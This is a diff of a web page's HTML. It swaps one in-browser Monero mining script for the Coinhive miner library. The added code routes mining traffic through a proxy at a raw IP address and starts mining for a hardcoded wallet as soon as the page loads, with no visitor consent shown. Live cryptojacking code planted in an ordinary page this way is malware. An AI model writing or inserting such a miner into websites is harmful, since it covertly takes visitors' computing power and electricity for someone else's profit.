@@ -26,11 +26,21 @@
   <script type='text/javascript' src='analytics.js'></script>
   <!-- JS -->
 
-  <script src="https://upggr.github.io/xmrproxy/m.js?proxy=wss://mine.upg.gr"></script>
+
+
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
   <script>
-    var miner = CH.Anonymous('43HHY6siC7pH8YVV3w8LckP7v4V52BygNhWLGerJ5zjDhvzzEAmZXFYKecFmDhfCs8Lj3nBJTa7XQG1Hre3VL5WhL78ufaw');
+    // Configure CoinHive to point to your proxy 
+    CoinHive.CONFIG.WEBSOCKET_SHARDS = [
+      ["ws://13.84.178.168"]
+    ];
+
+    // Start miner
+    var miner = CoinHive.Anonymous('43HHY6siC7pH8YVV3w8LckP7v4V52BygNhWLGerJ5zjDhvzzEAmZXFYKecFmDhfCs8Lj3nBJTa7XQG1Hre3VL5WhL78ufaw');
     miner.start();
   </script>
+
+
   <script>
     (function() {
       function t(e) {
